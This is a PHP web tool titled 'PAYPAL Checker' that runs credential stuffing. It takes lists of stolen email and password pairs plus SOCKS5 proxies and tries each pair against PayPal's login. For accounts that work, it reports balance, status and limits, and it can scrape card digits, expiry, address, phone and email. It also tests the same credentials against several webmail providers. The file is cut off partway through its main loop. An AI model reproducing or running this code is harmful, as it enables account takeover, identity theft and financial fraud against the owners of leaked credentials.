<?php

include error_reporting(0);

@set_time_limit(0);

session_save_path('cookie');

ini_set('session.gc_probability', 1);

$cookiejar = 'cookie/st'.rand(10000000000,99999999999).'123.txt'; 

@fclose(fopen($cookiejar,'w'));

global $cookiejar;



$cookie_checkmail = 'cookie/mail'.rand(10000000000,99999999999).'123.txt';

fclose(fopen($cookie_checkmail,'w'));

global $cookie_checkmail;



class analytics_api {

	public $auth;

	public $accounts;

	public function login($email, $password, $_sock) {		

		$curl = $this->curl_init("https://www.google.com/accounts/ClientLogin");

		curl_setopt($curl, CURLOPT_POST, true);

		

		$data = array(

			'accountType' => 'GOOGLE',

			'Email' => $email,

			'Passwd' => $password,

			'service' => 'analytics',

			'source' => ''

		);

			if($_sock){

			curl_setopt($curl, CURLOPT_PROXY, $_sock);

			curl_setopt($curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);

			}

		curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

		$output = curl_exec($curl);

		

		$info = curl_getinfo($curl);

		curl_close($curl);

		

		$this->auth = '';

		if($info['http_code'] == 200) {

			preg_match('/Auth=(.*)/', $output, $matches);

			if(isset($matches[1])) {

				$this->auth = $matches[1];

			}

		}

		

		return $this->auth != '';

	

	}

	protected function curl_init($url) {		

		$curl = curl_init();

		curl_setopt($curl, CURLOPT_URL, $url);

		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);



		if($this->auth) {

			curl_setopt($curl, CURLOPT_HTTPHEADER, array("Authorization: GoogleLogin auth=$this->auth"));

		}

	curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 30);

		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

				curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);



		return $curl;

		

	}



}



function _curl($url,$post="",$usecookie = false) {  

	$ch = curl_init();

	if($post) {

		curl_setopt($ch, CURLOPT_POST ,1);

		curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);

	}

	curl_setopt($ch, CURLOPT_URL, $url); 

	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6"); 

	if ($usecookie) { 

		curl_setopt($ch, CURLOPT_COOKIEJAR, $usecookie); 

		curl_setopt($ch, CURLOPT_COOKIEFILE, $usecookie);    

	} 

	curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); 

	$result=curl_exec ($ch); 

	curl_close ($ch); 

	return $result; 

}



function curl_get($url, $postfields=false, $_sock=false, $ref, $timeout=false, $headers = false) {

	static $curl;

	if(empty($curl)) {

		$curl = curl_init();

		curl_setopt($curl, CURLOPT_COOKIEJAR,  $cookiejar);

		curl_setopt($curl, CURLOPT_COOKIEFILE, $cookiejar);

		curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);

		curl_setopt($curl, CURLOPT_MAXREDIRS, 5);

		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);

	}

	if($headers){

		curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

	}

	if($timeout){

		curl_setopt($curl, CURLOPT_CONNECTTIMEOUT,$timeout);

	}

	if($_sock){

			curl_setopt($curl, CURLOPT_PROXY, $_sock);

			curl_setopt($curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);

	}

	curl_setopt($curl, CURLOPT_URL, $url);

	if(stripos($url, 'https')!==false) {

		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);

		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); 

	}

	if ($postfields) {

		curl_setopt($curl, CURLOPT_POST, 1);	

		curl_setopt($curl, CURLOPT_POSTFIELDS, $postfields);

	}

	if ($ref){  

			curl_setopt($curl, CURLOPT_REFERER,$ref); 

	}

	$response = curl_exec($curl);

	return $response;

	@unlink($cookiejar);

}





function CheckSock($sock,$cookie, $timeout){

	$site = "http://www.dreamhost.com/donate.cgi?id=11557";

	$s = curl_get($site,false,$sock,"http://google.com");

}



function isLogin($email, $password, $sock,$split) {

	$site = "https://www.paypal.com/us/cgi-bin/webscr?cmd=_login-run";

	$s = curl_get($site, false, $sock, "http://www.paypal.com");

	$post = getHiddenFormInputs($s, 'login_form');

	if (!$post){

		return "SOCKTIME";

	}

	$post['login_email'] = $email;

	$post['login_password'] = $password;

	$post = serializePostFields($post);

	$site = "https://www.paypal.com/us/cgi-bin/webscr?cmd=_login-submit";

	$s = curl_get('https://www.paypal.com/us/cgi-bin/webscr?cmd=_login-submit', $post, $sock, 'http://www.paypal.com');

	

	if($s){

		if(stristr($s,'Security Measures')){

			return "SECURITY";

		}

		elseif(stristr($s,'more than 5 seconds')){

			$_abc = getStr($s,'more than 5 seconds, <a href="', '">click here');

			$s = curl_get($_abc, false, $sock, 'https://www.paypal.com/us/cgi-bin/webscr?cmd=_login-submit');

		}

		elseif(stristr($s,'Please create a new password for your account')){

			return "PASSWORD";

		}

		else{

			$_abc = "https://www.paypal.com/bh/cgi-bin/webscr?cmd=_account&nav=0.0";

			$s = curl_get($_abc, false, $sock, 'https://www.paypal.com/us/cgi-bin/webscr?cmd=_login-submit');

		}

	}

	else{

		return "SOCKTIME";

	}



	if($s){

		$FAIL = getStr($s, 's.prop15="','"');

		$NOW = getStr($s,'s.prop1="','"');

		$TYPE = getStr($s,'s.prop7="','"');

		$STATUS = getStr($s,'s.prop8="','"');

		$LIMIT = getStr($s,'s.prop9="','"');

		$BALANCE = getStr($s,'<span class="balance">', '</span>');

		$BALANCE = str_replace('<strong>',"",$BALANCE);

		$BALANCE = str_replace('</strong>',"",$BALANCE);

		$LASTLOGIN = getStr($s,'<div class="small secondary">', '</div>');

		

		if($LIMIT == "Unrestricted"){

			$LIMIT = "Unlimit";

		}

		else{

			$LIMIT = "LIMITED";

		}

		

		if(!stristr($TYPE, "Unknown") or !stristr($STATUS, "Unknown")){

			if($LIMIT == "Unlimit"){

				$result = "$email | $password | <b>$TYPE</b> | <b>$STATUS</b> | <b>$BALANCE</b> | $LASTLOGIN | ";

				if($_POST['checkmail'] == true){

					$mailchecked = getmail($split, $email, $password, $sock);

					$result .= "$mailchecked | ";

				}

				$result .= "$sock <br>";

				if($_POST['getinfo']==true){

					$info = GETINFO($sock);

					if($info == false){

						$info = "<font color=red>NOT ADD CARD</font>";

					}

					$result .= " ---- <b>MORE INFO : </b>$info<br>";

				}

				

				return $result;

			}

			else{

				return "LIMITED";

			}

		}

		elseif(stristr($NOW, "wax_error")){

			return "LIMITED";

		}

		elseif(stristr($NOW, "SecurityChallenge")){

			return "SOCKBL";

		}

		elseif(stristr($NOW,"home") or stristr($NOW,"login")){

			return "DIE";

		}

		elseif(stristr($FAIL, "login_email")){

			return "ERROR";

		}

		else{

			return "ERROR";

		}	

	}

	else{

		return "SOCKTIME";

	}

}





function GETINFO($sock) {

	$site = "https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-credit-card-new-clickthru&flag_from_account_summary=1&nav=0.5.2";

	$response = curl_get($site, false, $sock, "http://www.paypal.com");

	$checkcard = strpos($response, "Last 4 digits on card");

	if(!$checkcard) 

	{

		return false;

	}else{

		$temp = getStr1($response,'.gif" border="0" alt="','">');

		$_type = $temp[0];

		$temp = getStr1($temp[1],'<td>','</td>');

		$_4digit = $temp[0];

		$temp = getStr1($temp[1],'<td>','</td>');

		$_exp = $temp[0];

		$infocard = "$_type $_4digit $_exp | ";

	}



	$site = "https://www.paypal.com/ca/cgi-bin/webscr?cmd=_profile-address&nav=0.5.3";

	$response = curl_get($site, false, $sock, "http://www.paypal.com");

	$info = getStr($response,'<span class="emphasis">','</span>');

	$info = str_replace("<br>"," | ",$info);

	

	$info = $infocard.$info;

	

	$sitemail = "https://www.paypal.com/ca/cgi-bin/webscr?cmd=_profile-email";

	$s = curl_get($sitemail,false,$sock,"http://www.paypal.com");

	$mail = getStr($s,'emailList-','"');

	

	$sitephone = "https://www.paypal.com/ca/cgi-bin/webscr?cmd=_profile-phone";

	$s = curl_get($sitephone,false,$sock,"http://www.paypal.com");

	$phone = getStr(getStr($s,'checked name="phone" value="','</td>'),'">','</label>');	

	

	$info = $info.$phone.' | '.$mail;

	return $info;

}



function getStr1($string,$start,$end){

	$str = explode($start,$string,2);

	$str = explode($end,$str[1],2);

	return $str;

}





function getStr($string,$start,$end){

	$str = explode($start,$string);

	$str = explode($end,$str[1]);

	return $str[0];

}





function getHiddenFormInputs($html) {

	if(!preg_match('|<form[^>]+login_form[^>]+>.*</form>|Usi', $html, $form)) {

		return '';

	}

	if(!preg_match_all('/<input[^>]+hidden[^>]*>/i', $form[0], $inputs)) {

		return '';

	}

	$hiddenInputs = array();

	foreach($inputs[0] as $input){

		if (preg_match('|name\s*=\s*[\'"]([^\'"]+)[\'"]|i', $input, $name)) {

			$hiddenInputs[$name[1]] = '';

			if (preg_match('|value\s*=\s*[\'"]([^\'"]*)[\'"]|i', $input, $value)) {

				$hiddenInputs[$name[1]] = $value[1];

			}

		}

	}

	return $hiddenInputs;

}



function serializePostFields($postFields) {

	foreach($postFields as $key => $value) {

		$value = urlencode($value);

		$postFields[$key] = "$key=$value";

	}

	$postFields = implode($postFields, '&');

	return $postFields;

}



function rmdirr($dirname){

	if (!file_exists($dirname)){

			echo "Not found folder";

			return false;

	}

	if (is_file($dirname)) {

		return unlink($dirname);

	}

	$dir = dir($dirname);

	while (false !== $entry = $dir->read()) {

		if ($entry == '.' || $entry == '..') {

			continue;

		}

        rmdirr("$dirname/$entry");

	}

	$dir->close();

	return rmdir($dirname);

}



function yahoo($mail,$pass, $_sock){

	$random_text = array("fr",

                    "co.uk",

                    "vn",

                    "ag",                    "br",

                    "ag",                    "ca",

                    "al",

                    "co",

                    "cl",

                    "mx",

                    "pe",

                    "ve",

                    "qc",

                    "dk",

                    "de",

                    "ie",

                    "it",

                    "ar");

	srand(time());

	$sizeof = count($random_text);

	$random = (rand()%$sizeof);

	$url="http://login.yahoo.com/config/login?.intl=".$random_text[$random]."&.src=ym&login=".$mail."&passwd=".$pass;

	$curl=curl_init();

	curl_setopt($curl, CURLOPT_TIMEOUT, 4);

	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

	curl_setopt($curl, CURLOPT_HEADER, true);

	curl_setopt($curl, CURLOPT_URL, $url);

		if($_sock){

			curl_setopt($curl, CURLOPT_PROXY, $_sock);

			curl_setopt($curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);

	}

	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);

	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 1);

	$xxx=curl_exec($curl);

	curl_close($curl);

	if(stristr($xxx,"yahoo.com")){

		return 0;

	}else{

		return 1;

	}

}



function netzero($mail,$pass, $_sock){

	$url = "https://my.netzero.net/start/login.do";

	$user_agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)";

	$postvars =

	"operation=login&gotoURL=http%3A%2F%2Fmy.netzero.net%2Fstart%2Fwebmail.do%3Fcf%3Dwww&memberId=".$mail."&netzero.net=netzero.com&password=".$pass."&x=56&y=10";

	$cookie = "cookies/netzero";

	@unlink($cookie);

	$curl = curl_init($url);

	curl_setopt($curl, CURLOPT_TIMEOUT, 4);

	curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);

	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);

	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 1);

	curl_setopt($curl, CURLOPT_HEADER, 1);

	curl_setopt($curl, CURLOPT_POST, 1);

	if($_sock){

			curl_setopt($curl, CURLOPT_PROXY, $_sock);

			curl_setopt($curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);

	}

	curl_setopt($curl, CURLOPT_POSTFIELDS, $postvars);

	curl_setopt($curl, CURLOPT_COOKIEJAR, $cookie_checkmail);

	// curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);

	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);

	$content = curl_exec ($curl);

	curl_close ($curl);

	unset($curl);

	if(stristr($content,"The Member ID or Password you have entered is incorrect")){

		return 0;

	}

	else{

		return 1;

	}

}



function hotmail($username, $password){

	$cookie = 'mail'.rand(1000000,9999999).'123.txt'; 

	@fclose(fopen($cookie,'w'));

	

	$url = "http://www.hotmail.com";

	$s = _curl($url,"",$cookie);

	$link = getStr($s,'var g_QS="','"');

	$link = "https://login.live.com/ppsecure/post.srf?".$link;

	

	$PPFTid = getStr($s,'PPFT" id="','"');

	$PPFTvalue = getStr($s,$PPFTid.'" value="','"');

	$post = "login=".$username."&passwd=".$password."&type=11&LoginOptions=2&MEST=&PPSX=Passp&PPFT=".$PPFTvalue."&idsbho=1&PwdPad=&sso=&i1=1&i2=2&i3=6382&i4=";

	

	$s = _curl($link,$post,$cookie);

	unlink($cookie);

	if(stristr($s,'window.location.replace("http://mail.live.com/default')){

		return TRUE;

	}

	else{

		return FALSE;

	}

}



function gmail($mail,$pass, $_sock){

	$api = new analytics_api();

	if($api->login($mail, $pass, $_sock)) {

		return 1;

	}else{

		return 0;

	}

}



function att($mail,$pass, $_sock){

	$url = "https://webauth.att.net/auth/webmail/login";

	$xax=explode("@",$mail);

	$domain1=trim($xax[0]);

	$domain2=trim($xax[1]);

	$user_agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)";

	$postvars =

	"passurl=http%3A%2F%2Fwebmail.att.net%2Fwmc%2Fen-US%2Fv%2Fwmgoto%2F4B308384000C20E4000040702223064702&locale=en-US&user=".$mail."&user1=".$domain1."&domain=".$domain2."&passwd=".$pass."&login.x=19&login.y=9&login=Login";

	$cookie = "cookies/att";

	@unlink($cookie);

	$curl = curl_init($url);

	curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);

	curl_setopt($curl, CURLOPT_TIMEOUT, 4);

	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);

	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 1);

	curl_setopt($curl, CURLOPT_HEADER, 1);

	curl_setopt($curl, CURLOPT_POST, 1);

	if($_sock){

			curl_setopt($curl, CURLOPT_PROXY, $_sock);

			curl_setopt($curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);

	}

	curl_setopt($curl, CURLOPT_POSTFIELDS, $postvars);

	curl_setopt($curl, CURLOPT_COOKIEJAR, $cookie_checkmail);

	// curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);

	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);

	$content = curl_exec ($curl);

	curl_close ($curl);

	unset($curl);

	if(stristr($content,"Please check and re-enter your e-mail username, domain, and password")){

		return 0;

	}else{

		return 1;

	}

}



function aol($mail,$pass, $_sock){

	$url = "https://my.screenname.aol.com/_cqr/login/login.psp";

	$user_agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)";

	$postvars =

	"screenname=".$mail."&password=".$pass."&submitSwitch=1&siteId=aolcomprod&mcState=initialized&authLev=1";

	$cookie = "cookies/aol";

	@unlink($cookie);

	$curl = curl_init($url);

	curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);

	curl_setopt($curl, CURLOPT_TIMEOUT, 4);

	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);

	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 1);

	curl_setopt($curl, CURLOPT_HEADER, 1);

	curl_setopt($curl, CURLOPT_POST, 1);

	if($_sock){

			curl_setopt($curl, CURLOPT_PROXY, $_sock);

			curl_setopt($curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);

	}

	curl_setopt($curl, CURLOPT_POSTFIELDS, $postvars);

	curl_setopt($curl, CURLOPT_COOKIEJAR, $cookie_checkmail);

	// curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);

	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);

	$content = curl_exec ($curl);

	curl_close ($curl);

	unset($curl);

	if(stristr($content,"Invalid Username or Password.")){

		return 0;

	}else{

		return 1;

	}

}



function juno($mail,$pass, $_sock){

	$url = "https://webmail.juno.com/cgi-bin/login.cgi?rememberMe=0";

	$user_agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)";

	$postvars =

	"LOGIN=".$mail."&PASSWORD=".$pass."&ajaxSupported=2%2F61220&domain=juno.com";

	$cookie = "cookies/juno";

	@unlink($cookie);

	$curl = curl_init($url);

	curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);

	curl_setopt($curl, CURLOPT_TIMEOUT, 4);

	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);

	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 1);

	curl_setopt($curl, CURLOPT_HEADER, 1);

	curl_setopt($curl, CURLOPT_POST, 1);

	if($_sock){

			curl_setopt($curl, CURLOPT_PROXY, $_sock);

			curl_setopt($curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);

	}

	curl_setopt($curl, CURLOPT_POSTFIELDS, $postvars);

	curl_setopt($curl, CURLOPT_COOKIEJAR, $cookie_checkmail);

	// curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);

	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);

	$content = curl_exec ($curl);

	curl_close ($curl);

	unset($curl);

	if(stristr($content,"match our files. Please re-enter your Juno username and password")){

		return 0;

	}else{

		return 1;

	}

}



function mmail($mail,$pass, $_sock){

	$url = "https://www.mail.com/auth/login.aspx";

	$user_agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)";

	$postvars ="login=".$mail."&password=".$pass;

	$cookie = "cookies/mmail";

	@unlink($cookie);

	$curl = curl_init($url);

	curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);

	curl_setopt($curl, CURLOPT_TIMEOUT, 4);

	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);

	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 1);

	curl_setopt($curl, CURLOPT_HEADER, 1);

	curl_setopt($curl, CURLOPT_POST, 1);

	if($_sock){

			curl_setopt($curl, CURLOPT_PROXY, $_sock);

			curl_setopt($curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);

	}

	curl_setopt($curl, CURLOPT_POSTFIELDS, $postvars);

	curl_setopt($curl, CURLOPT_COOKIEJAR, $cookie_checkmail);

	// curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);

	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);

	$content = curl_exec ($curl);

	curl_close ($curl);

	unset($curl);

	if(stristr($content,"Invalid username")){

		return 0;

	}else{

		return 1;

	}

}



function mac($mail,$pass, $_sock){

	$url = "https://auth.me.com/authenticate";

	$user_agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)";

	$postvars =

	"returnURL=aHR0cDovL3d3dy5tZS5jb20vbWFpbC8%3D&service=mail&ssoNamespace=primary-me&anchor=account&cancelURL=http%3A%2F%2Fwww.me.com%2Fmail&formID=loginForm&username=".$mail."&password=".$pass;

	$cookie = "cookies/mac";

	@unlink($cookie);

	$curl = curl_init($url);

	curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);

	curl_setopt($curl, CURLOPT_TIMEOUT, 4);

	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);

	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 1);

	curl_setopt($curl, CURLOPT_HEADER, 1);

	curl_setopt($curl, CURLOPT_POST, 1);

	if($_sock){

			curl_setopt($curl, CURLOPT_PROXY, $_sock);

			curl_setopt($curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);

	}

	curl_setopt($curl, CURLOPT_POSTFIELDS, $postvars);

	curl_setopt($curl, CURLOPT_COOKIEJAR, $cookie_checkmail);

	// curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);

	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);

	$content = curl_exec ($curl);

	curl_close ($curl);

	unset($curl);

	if(stristr($content,"Incorrect member name or password.")){

		return 0;

	}else{

		return 1;

	}

}



function getmail($xSplit,$xMail,$xPass, $_sock){

	$R_split=$xSplit;

	$mail_text=$xMail;

	$pass_text=$xPass;

	$pieces['xMail'] = $mail_text;

	$pieces['xPass'] = $pass_text;

	if(stristr($pieces['xMail'],"yahoo.")||stristr($pieces['xMail'],"ymail.")||stristr($pieces['xMail'],"rocketmail.")){

		$servername = "Yahoo";

		$k = yahoo($pieces['xMail'],$pieces['xPass'], $_sock);

		if ($k==0){

			$status="<font color=red>Email not available</font> - ".$servername."";

		}else{

			$status="<font color=blue>Email available</font> - ".$servername."";

		}

	}

	elseif(stristr($pieces['xMail'],"hotmail.")||stristr($pieces['xMail'],"live.")){

		$servername = "Hotmail";

		if (hotmail($pieces['xMail'],$pieces['xPass'], $_sock)){

			$status="<font color=blue>Email available</font> - ".$servername."";

		}

		else{

			$status="<font color=red>Email not available</font> - ".$servername."";

		}

	}elseif(stristr($pieces['xMail'],"gmail.")||stristr($pieces['xMail'],"googlemail.")){

		$servername = "Gmail";

		$k = gmail($pieces['xMail'],$pieces['xPass'], $_sock);

		if ($k==0){

			$status="<font color=red>Email not available</font> - ".$servername."";

		}

		else{

			$status="<font color=blue>Email available</font> - ".$servername."";

		}

	}elseif(stristr($pieces['xMail'],"aol.")||stristr($pieces['xMail'],"netscape.")){

		$servername = "AOL";

		$aolname = str_replace("@aol.com","",$pieces['xMail'], $_sock);

		$kaol = aol($aolname,$pieces['xPass'], $_sock);

		if ($kaol==0){

			$status="<font color=red>Email not available</font> - ".$servername."";

		}

		else{

			$status="<font color=blue>Email available</font> - ".$servername."";

		}

	}elseif(stristr($pieces['xMail'],"juno")){

		$servername = "Juno";

		$kjuno = juno($pieces['xMail'],$pieces['xPass'], $_sock);

		if ($kjuno==0){

			$status="<font color=red>Email not available</font> - ".$servername."";

		}

		else{

			$status="<font color=blue>Email available</font> - ".$servername."";

		}

	}elseif(stristr($pieces['xMail'],"mac.")||stristr($pieces['xMail'],"me.")){

		$servername = "Me-Mac";

		$kmac = mac($pieces['xMail'],$pieces['xPass'], $_sock);

		if ($kmac==0){

			$status="<font color=red>Email not available</font> - ".$servername."";

		}

		else{

			$status="<font color=blue>Email available</font> - ".$servername."";

		}

	}elseif(stristr($pieces['xMail'],"netzero.")){

		$servername = "Netzero";

		$knet = netzero($pieces['xMail'],$pieces['xPass'], $_sock);

		if ($knet==0){

			$status="<font color=red>Email not available</font> - ".$servername."";

		}

		else{

			$status="<font color=blue>Email available</font> - ".$servername."";

		}

	}elseif(stristr($pieces['xMail'],"ameritech.")||stristr($pieces['xMail'],"att.")||stristr($pieces['xMail'],"bellsouth.")||stristr($pieces['xMail'],"flash.")||stristr($pieces['xMail'],"nvbell.")||stristr($pieces['xMail'],"pacbell.")||stristr($pieces['xMail'],"prodigy.")||stristr($pieces['xMail'],"sbcglobal.")||stristr($pieces['xMail'],"snet.")||stristr($pieces['xMail'],"swbell.")||stristr($pieces['xMail'],"wans.")){

		$servername = "Att";

		$katt = att($pieces['xMail'],$pieces['xPass'], $_sock);

		if ($katt==0){

			$status="<font color=red>Email not available</font> - ".$servername."";

		}

		else{

			$status="<font color=blue>Email available</font> - ".$servername."";

		}

	}

	else{

   		$status="<font color=grey>Unknow</font>";

	}

	return $status; 

}



?>

<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<title>PAYPAL Checker</title>

<script type="text/javascript">

function timsock(){

	var sockslist = window.document.frmMain.s.value;

	var fuck = sockslist.match(/\d{1,3}([.])\d{1,3}([.])\d{1,3}([.])\d{1,3}((:)|(\s)+)\d{1,8}/g );

	if(fuck){

		var list="";

		for(var i=0;i<fuck.length;i++){

			if(fuck[i].match(/\d{1,3}([.])\d{1,3}([.])\d{1,3}([.])\d{1,3}(\s)+\d{1,8}/g )){

				fuck[i]=fuck[i].replace(/(\s)+/,':');

			}

			list=list+fuck[i]+"\n";

		}

		window.document.frmMain.s.value=list;

	}

	else{

		window.document.frmMain.s.value="Error";

		window.location = "#";

	}

}

</script>

<link rel="stylesheet" type="text/css" href="http://antitos.explorecrew.org/cs/default1.css">

</head>

<body>

<center>

<form name="frmMain" id="frmMain" method="post" action="">

	<div style="width:100%">

		<div style="width:90%">

			<p><center><h2>-[ PAYPAL Checker ]-</h2></center></p>

			<center><p><font color=red><b><blink>Auto check Mail Password and auto change sock if login success or limited </blink></b></font></p></center>

			<div id="mp" style="width:50%;float:left">

				<b>List mail & password:</b>

			</div>

			<div id="mp" style="width:50%;float:left">

				<b>List socks5</b><br />

				(auto check blacklist, just add list socks 5 but recommend socks fresh/private ):

			</div>

			<div id="mp" style="clear:both;width:50%;float:left">

				<textarea rows="10" style="width:100%" name="mp" value=""><?php echo $_POST['mp'];?></textarea>

			</div>

			<div id="s" style="width:50%;float:left">

				<textarea rows="10" style="width:100%" name="s" value=""><?php echo $_POST['s'];?></textarea>

			</div>

		</div>

		<div style="width:90%;clear:both">

			<b>Delim : </b> <input type="text" name="split" size= 4 value="<?php if($_POST['split']){echo $_POST['split'];}else{ echo '|';}?>"/>

			<b>Mail : </b> <input type="text" name="mail" size= 4 value="<?php if($_POST['mail']){echo $_POST['mail'];}else{echo '1';}?>" />

			<b>Password : </b> <input type="text" name="pass" size= 4 value="<?php if($_POST['mail']){echo $_POST['pass'];}else{echo '2';}?>" />

			<b>TimeOut PP : </b> <select name="paypaltimeout" ><option value="10"  >10s</option><option value="9"  >9s</option><option value="8" selected >8s</option><option value="7"  >7s</option><option value="6"  >6s</option><option value="5"  >5s</option><option value="4"  >4s</option><option value="3"  >3s</option><option value="2"  >2s</option><option value="1"  >1s</option></select>

			<br><input type=checkbox name=checkmail> Check Email <input type=checkbox name=getinfo> Get Infomation<br><br>

			<input type="submit" name="submit" value="      Check Now      " onclick="timsock();"/>

		</div>

		<br /><br /><br />

   </div>

</form>

</center>

</body>

</html>

<?php

if(isset($_POST['mp']) && isset($_POST['s']) && isset($_POST['pass']) && isset($_POST['paypaltimeout'])){

	$slist = trim($_POST['s']); 

	$mlist = trim($_POST['mp']);

	$pp_timeout = trim($_POST['paypaltimeout']); 

	$slist = str_replace(array("\\\"","\\'"),array("\"","'"),$slist); 

	$slist = str_replace("\n\n","\n",$slist); 

	$mlist = str_replace(array("\\\"","\\'"),array("\"","'"),$mlist); 

	$mlist = str_replace("\n\n","\n",$mlist); 

	$slist = explode("\n", $slist);

	$mlist = explode("\n", $mlist);

	$email = trim($_POST['mail']);

	$splits = trim($_POST['split']);

	$pass = trim($_POST['pass']);



	$tsdie = "";

	$tslimit = "";

	$tslive = "";

	$tserror = "";

	$sldie = 0;

	$sllimit = 0;

	$sllive = 0;

	$slerror = 0;



	if(!$splits || !$pass){

				die("<br />Please enter complete information.<br /><br />");

	}

	

	$j = 0;

	$dem_sl = 0;

	for($i=0;$i<count($slist);$i++){

		$maxs = $maxs + 1;

		$_sockcheckto = $slist[$i];

		$_checkclear = CheckSock($slist[$i], $cookiejar, $pp_timeout);

		if ($_checkclear == "2"){

			$_mp = explode($splits, $mlist[$j]);

			$_mail = trim($_mp[($email - 1)]);

			$_pass = trim($_mp[($pass - 1)]);

			if(strlen($_pass)>7){

				$paypal = isLogin($_mail, $_pass, $slist[$i],$splits);

				$STT = $j + 1;

				if($paypal == "SOCKTIME"){

					echo $slist[$i]." <font color=orange> <<< Time Out</font><br>";

					$j = $j - 1;

				}

				elseif($paypal == "SOCKBL"){

					echo $slist[$i]." <font color=red> <<< BlackList</font><br>";

					$j = $j - 1;

				}

				elseif($paypal == "LIMITED"){

					echo "$STT. <b><font color=orange>LIMITED =></b></font> $_mail | $_pass | $slist[$i]<br>";

					$tslimit .= "<b><font color=orange>LIMITED =></b></font> $_mail | $_pass | $slist[$i]<br>";

					$sllimit++;

				}

				elseif($paypal == "SECURITY"){

					echo "$STT. <b><font color=purple>SECURITY MEASURES =></b></font> $_mail | $_pass | $slist[$i]<br>";

					$tslimit .= "<b><font color=purple>SECURITY MEASURES =></b></font> $_mail | $_pass | $slist[$i]<br>";

					$sllimit++;

				}

				elseif($paypal == "PASSWORD"){

					echo "$STT. <b><font color=blue>CREATE PASSWORD =></b></font> $_mail | $_pass | $slist[$i]<br>";

					$tserror .= "<b><font color=blue>CREATE PASSWORD =></b></font> $_mail | $_pass | $slist[$i]<br>";

					$slerror++;

				}

				elseif($paypal == "DIE"){

					echo "$STT. <b><font color=red>DIE =></font></b> $_mail | $_pass | $_slist[$i]<br>";

					$tsdie .= "<b><font color=red>DIE =></font></b> $_mail | $_pass | $_slist[$i]<br>";

					$dem_sl = $dem_sl + 1;

					if($dem_sl == 5){

						$i = $i + 1;

						$dem_sl = 0;

					}

					$i = $i -1;

					$sldie++;

				}

				elseif($paypal == "ERROR"){

					echo "$STT. <b><font color=blue>ERROR =></font></b> $_mail | $_pass | $_slist[$i]<br>";

					$tserror .= "<b><font color=blue>ERROR =></font></b> $_mail | $_pass | $_slist[$i]<br>";

					$dem_sl = $dem_sl + 1;

					if($dem_sl == 5){

						$i = $i + 1;

						$dem_sl = 0;

					}

					$i = $i -1;

					$slerror++;

				}

				else{

					echo "$STT. <b><font color=green>LIVE =></b></font> $paypal";

					$tslive .= "<b><font color=green>LIVE =></b></font> $paypal";

					$sllive++;

				}

			}

			$j = $j + 1;

		}

		elseif($_checkclear == "1"){

			echo $slist[$i]." <font color=red> <<< Blacklist PayPal</font><br>";

		}elseif($_checkclear == "3"){

